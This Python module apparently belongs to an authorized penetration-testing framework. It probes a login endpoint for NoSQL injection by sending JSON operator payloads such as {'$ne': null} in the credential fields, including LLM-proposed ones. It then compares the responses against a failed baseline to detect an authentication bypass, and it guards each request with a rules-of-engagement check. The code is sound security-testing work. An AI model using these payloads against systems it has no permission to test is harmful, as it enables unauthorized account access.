from __future__ import annotations

import json

import httpx

from ..config import load_engine
from ..contract import Capability, ScanResult
from ..roe_guard import ROEGuard, ROEViolation
from .payloads import NOSQL_PAYLOADS
from .. import http as _http
from ..util import any_handler_reached, unreached_reason


CAPABILITY = Capability(
    name="nosql_scan",
    description="NoSQL injection via JSON operator injection.",
    category="injection",
    cost="medium",
    destructive=False,
    idempotent=True,
)


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="POST"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _post(url, body, headers, timeout, verify, roe_guard):
    viol = _roe_block(roe_guard, url, "POST")
    if viol:
        return {"blocked": True, "error": f"ROE_BLOCK: {viol}"}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.post(url, json=body, headers=headers or {})
        return {"status": r.status_code, "body": (r.text or "")[:4000]}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _baseline(url, headers, timeout, verify, roe_guard):
    body = {"username": "nonexistent_sec_checker_probe",
            "password": "wrong_password_xyz"}
    return _post(url, body, headers, timeout, verify, roe_guard)


_FAIL_MARKERS = ("invalid", "incorrect", "failed", "failure", "unauthorized",
                 "not found", "denied", "wrong", "\"error\"", "'error'",
                 "forbidden", "bad credentials")
_SUCCESS_MARKERS = ("token", "\"success\": true", "\"success\":true",
                    "authenticated", "session", "welcome", "logged in",
                    "jwt", "access_token", "set-cookie")


def _is_failure(resp):
    body = (resp.get("body") or "").lower()
    return any(m in body for m in _FAIL_MARKERS)


def _is_success(resp):
    if not resp or resp.get("status") not in (200, 201, 202):
        return False
    body = (resp.get("body") or "").lower()
    if any(m in body for m in _FAIL_MARKERS):
        return False
    return any(m in body for m in _SUCCESS_MARKERS)


def _looks_bypassed(resp, baseline):
    if not resp or resp.get("status") is None:
        return False
    if resp["status"] not in (200, 201, 202):
        return False
    if not baseline or not _is_failure(baseline):
        return False
    if not _is_success(resp):
        return False
    return (resp.get("body") or "") != (baseline.get("body") or "")


def _augmented_nosql_payloads(login_url):
    try:
        from ..brains import payload_author
        objs = payload_author.propose_objects(
            "nosql_auth_bypass",
            '{"label": "ne_null", "op": {"$ne": null}}',
            {"target": login_url}, capability="nosql", cap=8)
    except Exception:
        objs = []
    extra = []
    for o in objs:
        op = o.get("op")
        if (isinstance(op, dict) and op
                and all(isinstance(k, str) and k.startswith("$") for k in op)):
            extra.append((str(o.get("label") or "llm"), op))
    seen = set()
    out = []
    for label, op in extra + list(NOSQL_PAYLOADS):
        key = json.dumps(op, sort_keys=True, default=str)
        if key not in seen:
            seen.add(key)
            out.append((label, op))
    return out


def scan(login_url, headers=None, roe_guard=None, timeout=8,
         username_field="username", password_field="password"):
    verify = _verify_tls()
    baseline = _baseline(login_url, headers, timeout, verify, roe_guard)
    if baseline.get("blocked"):
        return ScanResult(
            capability="nosql_scan", target=login_url,
            verdict="UNKNOWN", reason=baseline["error"],
        )

    attempts = []
    findings = []
    for label, op in _augmented_nosql_payloads(login_url):
        body = {username_field: op, password_field: op}
        r = _post(login_url, body, headers, timeout, verify, roe_guard)
        if r.get("blocked"):
            return ScanResult(
                capability="nosql_scan", target=login_url,
                verdict="UNKNOWN", reason=r["error"],
            )
        attempts.append({"op": label, "status": r.get("status"),
                         "error": r.get("error")})
        if _looks_bypassed(r, baseline):
            findings.append({"op": label,
                             "payload": json.dumps(op)})
            break

    if findings:
        return ScanResult(
            capability="nosql_scan", target=login_url,
            verdict="VULNERABLE", severity="high",
            reason=f"NoSQL auth bypass via {findings[0]['op']}",
            evidence={"findings": findings, "attempts": attempts},
        )
    if not any_handler_reached(attempts):
        return ScanResult(
            capability="nosql_scan", target=login_url,
            verdict="UNKNOWN",
            reason=unreached_reason(attempts),
            evidence={"attempts": attempts},
        )
    return ScanResult(
        capability="nosql_scan", target=login_url,
        verdict="PASS", severity="low",
        reason=f"no NoSQL bypass across {len(attempts)} attempts",
    )


__all__ = ["scan", "CAPABILITY"]
